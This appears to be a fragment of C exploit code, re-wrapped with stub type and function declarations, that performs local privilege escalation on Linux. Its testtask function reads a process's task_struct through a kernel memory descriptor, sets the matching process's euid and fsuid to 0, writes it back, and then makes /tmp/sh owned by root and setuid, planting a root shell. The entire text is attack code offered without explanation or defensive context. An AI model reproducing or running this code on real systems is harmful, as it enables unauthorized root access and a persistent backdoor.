
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct task_struct {scalar_t__ pid; scalar_t__ fsuid; scalar_t__ euid; } ;


 int SEEK_SET ;
 int SIZEOF ;
 int chmod (char*,int) ;
 int chown (char*,int ,int ) ;
 int exit (int ) ;
 int lseek (int ,unsigned int,int ) ;
 int mem_fd ;
 scalar_t__ mypid ;
 int read (int ,struct task_struct*,int ) ;
 int write (int ,struct task_struct*,int ) ;

void

testtask (unsigned int mem_offset)

{

struct task_struct some_task;

int uid, pid;

lseek (mem_fd, mem_offset, SEEK_SET);

read (mem_fd, &some_task, SIZEOF);

if (some_task.pid == mypid)

{

some_task.euid = 0;

some_task.fsuid = 0;

lseek (mem_fd, mem_offset, SEEK_SET);

write (mem_fd, &some_task, SIZEOF);



chown ("/tmp/sh", 0, 0);

chmod ("/tmp/sh", 04755);

exit (0);

}

}
